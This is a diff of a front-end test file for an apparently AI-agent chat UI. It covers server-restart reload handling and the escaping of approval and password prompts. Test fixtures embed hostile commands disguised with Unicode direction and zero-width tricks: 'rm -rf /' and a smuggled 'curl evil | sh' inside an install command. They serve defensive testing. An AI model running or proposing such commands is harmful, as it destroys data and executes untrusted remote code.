@@ -75,7 +75,7 @@ describe("a tab left open across a server restart (exit test P1)", () => {
     event(model, { type: "state", state: { kind: "ready", lastSeq: 9 } });
     frame(model, { type: "approval.request", seq: 5, requestID: "apr_live", action: "shell: pwd", preview: "", buttons: ["once"] });
     sent.length = 0;
-    event(model, { type: "durableReloadRequired" });
+    event(model, { type: "durableReloadRequired", restarted: true });
 
     expect(screen.queryByRole("button", { name: "Stop" })).not.toBeInTheDocument();
     expect(screen.queryByText("Writing…")).not.toBeInTheDocument();
@@ -93,7 +93,7 @@ describe("a tab left open across a server restart (exit test P1)", () => {
     frame(model, { type: "token", seq: 3, turnID: "trn_1", threadID: "thr_1", delta: "queued" });
     event(model, { type: "state", state: { kind: "handshaking" } });
     event(model, { type: "state", state: { kind: "ready", lastSeq: 9 } });
-    event(model, { type: "durableReloadRequired" });
+    event(model, { type: "durableReloadRequired", restarted: true });
     // The error frame that follows flushes the token queue before it is applied.
     frame(model, { type: "error", seq: 4, code: "resync_gap", message: "cannot replay" });
     await new Promise((resolve) => setTimeout(resolve, 60));
@@ -109,7 +109,7 @@ describe("a tab left open across a server restart (exit test P1)", () => {
     // The loop reconnects, then reports the gap as an event and passes the error frame on.
     event(model, { type: "state", state: { kind: "handshaking" } });
     event(model, { type: "state", state: { kind: "ready", lastSeq: 9 } });
-    event(model, { type: "durableReloadRequired" });
+    event(model, { type: "durableReloadRequired", restarted: true });
     frame(model, { type: "error", seq: 4, code: "resync_gap", message: "cannot replay from 1" });
     expect(model.getSnapshot().conversation.isStreaming).toBe(false);
     expect(model.getSnapshot().conversation.forms).toHaveLength(0);
@@ -223,7 +223,7 @@ rm -rf /${RLO}txt.exe${ZWSP}`, createdAt: "2026-11-10T10:00:00.000Z" },
     expect(text).toContain(`echo ok${BS}nrm -rf /${BS}u202Etxt.exe${BS}u200B`);
     expect(text).not.toContain(RLO);
     expect(text).not.toContain(ZWSP);
-    expect(text).toContain("… (+280 chars)");
+    expect(text).toContain("characters not shown");
   });
 
   it("escapes the password prompt's purpose and command", () => {
@@ -233,7 +233,7 @@ rm -rf /${RLO}txt.exe${ZWSP}`, createdAt: "2026-11-10T10:00:00.000Z" },
     const { container } = renderWith(model, <RootView />);
     const card = container.querySelector(".secret-card")!;
     expect(card.textContent).toContain(`Install${BS}u202Egnp.exe`);
-    expect(card.textContent).toContain(`sudo apt install x${BS}n; curl evil | sh${BS}u200B`);
+    expect(card.textContent).toContain(`sudo apt install x${String.fromCodePoint(10)}; curl evil | sh${BS}u200B`);
     expect(card.textContent).not.toContain(RLO);
     expect(card.textContent).not.toContain(ZWSP);
   });
